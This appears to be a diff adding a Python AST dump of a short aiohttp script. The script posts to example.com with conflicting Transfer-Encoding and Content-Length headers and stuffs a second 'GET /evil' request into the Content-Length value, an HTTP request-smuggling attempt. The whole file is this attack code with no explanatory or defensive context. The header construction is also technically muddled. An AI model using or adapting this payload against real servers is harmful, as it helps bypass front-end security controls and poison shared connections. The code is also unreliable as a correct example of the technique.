@@ -1,0 +1,117 @@
+Module(
+    body=[
+        Import(
+            names=[
+                alias(name='aiohttp')]),
+        Import(
+            names=[
+                alias(name='asyncio')]),
+        AsyncFunctionDef(
+            name='fetch',
+            args=arguments(
+                posonlyargs=[],
+                args=[
+                    arg(arg='url')],
+                kwonlyargs=[],
+                kw_defaults=[],
+                defaults=[]),
+            body=[
+                Assign(
+                    targets=[
+                        Name(id='headers', ctx=Store())],
+                    value=Dict(
+                        keys=[
+                            Constant(value='Transfer-Encoding'),
+                            Constant(value='Content-Length')],
+                        values=[
+                            Constant(value='chunked'),
+                            Constant(value='0\r\n\r\nGET /evil HTTP/1.1\r\nHost: example.com\r\n\r\n')])),
+                AsyncWith(
+                    items=[
+                        withitem(
+                            context_expr=Call(
+                                func=Attribute(
+                                    value=Name(id='aiohttp', ctx=Load()),
+                                    attr='ClientSession',
+                                    ctx=Load()),
+                                args=[],
+                                keywords=[]),
+                            optional_vars=Name(id='session', ctx=Store()))],
+                    body=[
+                        AsyncWith(
+                            items=[
+                                withitem(
+                                    context_expr=Call(
+                                        func=Attribute(
+                                            value=Name(id='session', ctx=Load()),
+                                            attr='post',
+                                            ctx=Load()),
+                                        args=[
+                                            Name(id='url', ctx=Load())],
+                                        keywords=[
+                                            keyword(
+                                                arg='headers',
+                                                value=Name(id='headers', ctx=Load()))]),
+                                    optional_vars=Name(id='response', ctx=Store()))],
+                            body=[
+                                Return(
+                                    value=Await(
+                                        value=Call(
+                                            func=Attribute(
+                                                value=Name(id='response', ctx=Load()),
+                                                attr='text',
+                                                ctx=Load()),
+                                            args=[],
+                                            keywords=[])))])])],
+            decorator_list=[]),
+        AsyncFunctionDef(
+            name='main',
+            args=arguments(
+                posonlyargs=[],
+                args=[],
+                kwonlyargs=[],
+                kw_defaults=[],
+                defaults=[]),
+            body=[
+                Assign(
+                    targets=[
+                        Name(id='url', ctx=Store())],
+                    value=Constant(value='http://example.com')),
+                Assign(
+                    targets=[
+                        Name(id='response', ctx=Store())],
+                    value=Await(
+                        value=Call(
+                            func=Name(id='fetch', ctx=Load()),
+                            args=[
+                                Name(id='url', ctx=Load())],
+                            keywords=[]))),
+                Expr(
+                    value=Call(
+                        func=Name(id='print', ctx=Load()),
+                        args=[
+                            Name(id='response', ctx=Load())],
+                        keywords=[]))],
+            decorator_list=[]),
+        If(
+            test=Compare(
+                left=Name(id='__name__', ctx=Load()),
+                ops=[
+                    Eq()],
+                comparators=[
+                    Constant(value='__main__')]),
+            body=[
+                Expr(
+                    value=Call(
+                        func=Attribute(
+                            value=Name(id='asyncio', ctx=Load()),
+                            attr='run',
+                            ctx=Load()),
+                        args=[
+                            Call(
+                                func=Name(id='main', ctx=Load()),
+                                args=[],
+                                keywords=[])],
+                        keywords=[]))],
+            orelse=[])],
+    type_ignores=[])
